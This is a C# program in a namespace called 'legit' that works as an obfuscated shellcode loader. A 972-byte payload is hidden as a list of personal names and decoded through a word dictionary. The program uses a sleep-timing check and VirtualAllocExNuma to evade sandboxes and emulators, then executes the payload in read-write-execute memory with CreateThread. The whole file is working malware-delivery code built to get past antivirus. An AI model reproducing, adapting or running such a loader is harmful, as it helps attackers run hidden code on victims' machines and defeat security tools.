using System;
using System.Runtime.InteropServices;

namespace legit
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static string[] translate_dict = new string[256] { "krier", "arin", "carrissa", "glynnis", "nikolai", "irena", "sati", "dickens", "jesus", "gunars", "deniece", "maurizia", "buenaventura", "lauri", "kimberlee", "poh-soon", "ursuline", "dominica", "melva", "behnam", "sybyl", "catherine", "kamil", "brandais", "junquera", "agna", "willi", "alexandria", "atlanta", "tarquin", "raylan", "adán", "silva", "osric", "wendi", "valeriano", "yu-kai", "reno", "jaume", "shirley", "logntp", "niko", "celise", "alb", "nissa", "gunter", "hildy", "anthe", "toby", "merunix", "marwan", "kien-nghiep", "oliva", "em", "dorelle", "ignacio", "siobhan", "reginald", "chelsea", "seline", "rhys", "alonzo", "saraann", "sandi", "wan", "cerys", "manou", "bryanna", "avivah", "maxi", "rori", "zayla", "malethia", "ryder", "cleto", "niki", "khamdy", "kiri", "sonoe", "baylor", "dorelia", "ramin", "timi", "mara", "clovis", "marjan", "weringh", "manoj", "petri", "jonis", "brylee", "pradyumn", "del", "jori", "bhanu", "marella", "lyndsay", "gurvinder", "dear", "maisey", "dasi", "cody", "ladonna", "sohail", "dawn", "melibea", "noella", "bidget", "france", "heidi", "vuquoc", "lidia", "hatty", "niobe", "riya", "roobbie", "zabrina", "ceil", "ada", "herbie", "jozsef", "lyndsey", "donall", "lisette", "ophelie", "adriana", "kelila", "marie-jeanne", "simran", "rory", "harri", "shirl", "tamarra", "pastora", "theodor", "thelma", "nonna", "fu-shin", "pension", "lynette", "lorianne", "evan", "leontyne", "deloris", "amabel", "alaska", "víctor", "hamid", "perrine", "tonye", "florian", "message", "alverta", "naile", "arliene", "franki", "dara", "janelle", "kristien", "gimena", "zdenko", "larissa", "trevon", "pelly", "delcine", "roelof", "dayton", "carol", "billye", "ronnie", "draven", "matilde", "marvette", "twila", "piroska", "emery", "scovill", "maxim", "adam", "ezella", "okey", "tresa", "meridel", "patadm", "iseabal", "royce", "cordy", "woei-peng", "ariadne", "upen", "pip", "lu", "mella", "syyed", "nigel", "the", "leonora", "maye", "consuelo", "cornelle", "leonela", "yuksel", "iwan", "doralia", "alice", "luelle", "tatiania", "kylen", "elzbieta", "cang", "renesmee", "mateo", "whitfield", "jamal", "clancy", "leon", "maite", "phylis", "flory", "celie", "lissa", "libbey", "auguste", "franco", "aubriana", "charleen", "elin", "hestia", "brietta", "donia", "constantine", "jersey", "eugenie", "cheuk", "alaina", "temperance", "meriann", "delmar", "essam", "kristine", "eamon", "ardene", "haggar", "shela", "loralie", "greer", "karia", "jessalin", "careen", "krishan", "vipi", "stoddard", "colton", "pradip", "ira", "sonny" };

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            string[] dict_words = new string[972] { "colton","eugenie","syyed","krier","krier","krier","cerys","ramin","cerys","dorelia","timi","ramin","weringh","malethia","merunix","renesmee","cody","malethia","lynette","timi","lyndsay","malethia","lynette","timi","junquera","malethia","lynette","timi","silva","malethia","lynette",
            "riya","dorelia","malethia","poh-soon","patadm","cleto","cleto","kiri","merunix","yuksel","malethia","merunix","mella","marvette","rhys","gurvinder","ophelie","carrissa","nissa","silva","cerys","syyed","yuksel","lauri","cerys","arin","syyed","elin","delmar","timi",
            "cerys","ramin","malethia","lynette","timi","silva","lynette","manou","rhys","malethia","arin","elzbieta","lynette","simran","nonna","krier","krier","krier","malethia","pastora","mella","zabrina","dawn","malethia","arin","elzbieta","dorelia","lynette","malethia","junquera",
            "avivah","lynette","wan","silva","ryder","arin","elzbieta","sohail","hestia","weringh","malethia","sonny","yuksel","cerys","lynette","oliva","nonna","malethia","arin","clancy","kiri","merunix","yuksel","malethia","merunix","mella","marvette","cerys","syyed","yuksel",
            "lauri","cerys","arin","syyed","siobhan","aubriana","ceil","ardene","khamdy","glynnis","khamdy","yu-kai","jesus","maxi","reginald","cang","ceil","leon","petri","avivah","lynette","wan","yu-kai","ryder","arin","elzbieta","ladonna","cerys","lynette","buenaventura",
            "malethia","avivah","lynette","wan","atlanta","ryder","arin","elzbieta","cerys","lynette","nikolai","nonna","malethia","arin","elzbieta","cerys","petri","cerys","petri","bhanu","jonis","brylee","cerys","petri","cerys","jonis","cerys","brylee","malethia","shirl",
            "meriann","silva","cerys","timi","sonny","aubriana","petri","cerys","jonis","brylee","malethia","lynette","melva","cheuk","weringh","sonny","sonny","sonny","jori","malethia","rory","leonora","hatty","ira","sonny","sonny","malethia","evan","khamdy","yu-kai",
            "toby","cerys","cordy","maxim","cleto","bidget","maxim","sonny","jamal","cheuk","hamid","krier","krier","krier","bhanu","noella","krier","malethia","evan","ariadne","yu-kai","silva","arin","krier","krier","manoj","malethia","evan","khamdy","yu-kai",
            "lyndsay","ramin","malethia","merunix","yuksel","ramin","ramin","dawn","nikolai","krier","krier","jesus","ramin","ryder","fu-shin","yuksel","ryder","fu-shin","leonela","malethia","fu-shin","haggar","cerys","cordy","lyndsey","alice","sandi","theodor","sonny","jamal",
            "malethia","pastora","mella","poh-soon","tamarra","roobbie","krier","krier","krier","noella","wan","ryder","cornelle","syyed","krier","ursuline","krier","krier","kiri","fu-shin","leonela","malethia","merunix","renesmee","malethia","lynette","poh-soon","cerys","cordy","piroska",
            "thelma","víctor","sandi","sonny","jamal","malethia","fu-shin","the","clovis","ryder","cornelle","syyed","cerys","carrissa","krier","krier","temperance","zayla","cerys","petri","malethia","fu-shin","nigel","malethia","lynette","poh-soon","cerys","cordy","maye","maite",
            "upen","jersey","sonny","jamal","malethia","merunix","yuksel","ramin","ramin","ramin","ryder","fu-shin","phylis","ryder","fu-shin","leonela","malethia","lynette","poh-soon","cerys","cordy","consuelo","marvette","arliene","lyndsey","sonny","jamal","malethia","merunix","yuksel",
            "malethia","sonny","yuksel","cerys","cordy","avivah","eamon","em","aubriana","sonny","jamal","eugenie","dawn","sonny","sonny","sonny","cody","jozsef","hatty","france","lidia","riya","cody","riya","hildy","cody","jozsef","cody","krier","eugenie",
            "okey","sonny","sonny","sonny","colton","malethia","shirl","brietta","eamon","eugenie","alice","krier","krier","krier","cerys","ramin","cerys","dorelia","timi","malethia","merunix","renesmee","cody","malethia","lynette","timi","lyndsay","malethia","lynette","timi",
            "junquera","malethia","lynette","timi","silva","ramin","weringh","malethia","poh-soon","patadm","cleto","cleto","kiri","merunix","yuksel","malethia","lynette","riya","dorelia","malethia","merunix","mella","marvette","rhys","gurvinder","ophelie","carrissa","nissa","silva","cerys",
            "syyed","yuksel","lauri","cerys","arin","syyed","elin","delmar","timi","cerys","ramin","malethia","lynette","timi","silva","lynette","manou","rhys","malethia","arin","elzbieta","ladonna","rory","jozsef","junquera","maurizia","carrissa","poh-soon","pastora","riya",
            "krier","krier","krier","lynette","simran","nonna","krier","krier","krier","malethia","pastora","mella","zabrina","sohail","malethia","arin","elzbieta","dorelia","avivah","lynette","wan","silva","lynette","malethia","junquera","ryder","arin","elzbieta","hestia","weringh",
            "kiri","merunix","yuksel","malethia","sonny","yuksel","cerys","lynette","oliva","nonna","malethia","arin","clancy","malethia","merunix","mella","marvette","cerys","syyed","yuksel","lauri","cerys","arin","syyed","siobhan","aubriana","ceil","ardene","khamdy","glynnis",
            "khamdy","yu-kai","jesus","maxi","reginald","cang","ceil","maite","petri","avivah","lynette","wan","yu-kai","ryder","arin","elzbieta","ladonna","cerys","lynette","buenaventura","malethia","avivah","lynette","wan","atlanta","ryder","arin","elzbieta","cerys","lynette",
            "nikolai","nonna","malethia","arin","elzbieta","cerys","petri","cerys","petri","bhanu","jonis","brylee","cerys","petri","cerys","jonis","cerys","brylee","malethia","shirl","meriann","silva","cerys","timi","sonny","aubriana","petri","cerys","jonis","brylee",
            "malethia","lynette","melva","cheuk","niki","sonny","sonny","sonny","jori","malethia","merunix","celie","mara","ryder","pip","herbie","melibea","vuquoc","melibea","vuquoc","cody","zabrina","krier","cerys","weringh","malethia","fu-shin","charleen","ryder","cornelle",
            "nigel","khamdy","herbie","jaume","dickens","sonny","jamal","mara","mara","malethia","fu-shin","charleen","mara","brylee","kiri","merunix","mella","kiri","merunix","yuksel","mara","mara","ryder","cordy","chelsea","weringh","lyndsey","carol","krier","krier",
            "krier","krier","sonny","jamal","eugenie","ursuline","krier","krier","krier","merunix","merunix","marwan","hildy","merunix","reginald","reginald","hildy","merunix","em","reginald","hildy","merunix","marwan","merunix","krier","brylee","malethia","fu-shin","syyed","ryder",
            "cornelle","mella","woei-peng","arin","krier","krier","kiri","merunix","yuksel","mara","mara","noella","glynnis","mara","ryder","cordy","manoj","fu-shin","gimena","consuelo","krier","krier","krier","krier","sonny","jamal","eugenie","adán","krier","krier",
            "krier","anthe","baylor","ceil","manou","marwan","herbie","noella","jozsef","marella","ryder","mara","marwan","bidget","cleto","gurvinder","marjan","vuquoc","donall","avivah","noella","reginald","ladonna","ramin","dorelia","baylor","marella","gurvinder","zabrina","bidget",
            "lidia","krier","malethia","fu-shin","syyed","mara","brylee","cerys","petri","kiri","merunix","yuksel","mara","malethia","iseabal","krier","marwan","billye","tamarra","krier","krier","krier","krier","dorelia","mara","mara","ryder","cornelle","nigel","temperance",
            "marjan","hildy","seline","sonny","jamal","malethia","fu-shin","consuelo","noella","deniece","marella","malethia","fu-shin","ardene","noella","adán","brylee","timi","dawn","simran","kien-nghiep","krier","krier","ryder","fu-shin","aubriana","noella","nikolai","cerys","jonis",
            "ryder","cordy","ceil","rori","kristien","theodor","krier","krier","krier","krier","sonny","jamal","kiri","merunix","mella","mara","brylee","malethia","fu-shin","ardene","kiri","merunix","yuksel","kiri","merunix","yuksel","mara","mara","ryder","cornelle",
            "nigel","gunter","sati","junquera","lisette","sonny","jamal","pastora","mella","ceil","valeriano","malethia","cornelle","syyed","nonna","behnam","krier","krier","ryder","cordy","avivah","eamon","em","aubriana","krier","krier","krier","krier","sonny","jamal",
            "malethia","sonny","kylen","zabrina","carrissa","temperance","draven","ryder","cornelle","nigel","eamon","tresa","trevon","weringh","sonny","jamal","mara","jonis","noella","wan","brylee","ryder","fu-shin","cang","syyed","elin","ursuline","ryder","cornelle","mella",
            "krier","ursuline","krier","krier","ryder","cordy","petri","delcine","mara","donia","krier","krier","krier","krier","sonny","jamal","malethia","hamid","mara","mara","malethia","fu-shin","jersey","malethia","fu-shin","ardene","malethia","fu-shin","flory","ryder",
            "cornelle","mella","krier","silva","krier","krier","ryder","fu-shin","krishan","ryder","cordy","melva","florian","fu-shin","elin","krier","krier","krier","krier","sonny","jamal","malethia","shirl","leonora","silva","pastora","mella","zabrina","piroska","ladonna",
            "lynette","dickens","malethia","arin","the","pastora","mella","ceil","renesmee","petri","the" };
            int shellcode_len = dict_words.Length;

            byte[] shellcode = new byte[shellcode_len];

            // Decode shellcode using input Dictionary wordlist "translate_dict"
            for (uint sc_index = 0; sc_index < shellcode_len; sc_index++) // Loop through shellcode words first
            {
                for (uint dict_index = 0; dict_index < 256; dict_index++) // Loop through all possible dictionary words second
                {
                    // If the word was found in the shellcode Dictionary
                    if (translate_dict[dict_index] == dict_words[sc_index])
                    {
                        // Convert shellcode to byte and add to output variable
                        shellcode[sc_index] = (byte)dict_index;
                        break;
                    }
                }
            }

            IntPtr funcAddr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);

            if (funcAddr == null)
            {
                return;
            }

            Marshal.Copy(shellcode, 0, funcAddr, shellcode_len);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);

            return;

        }
    }
}
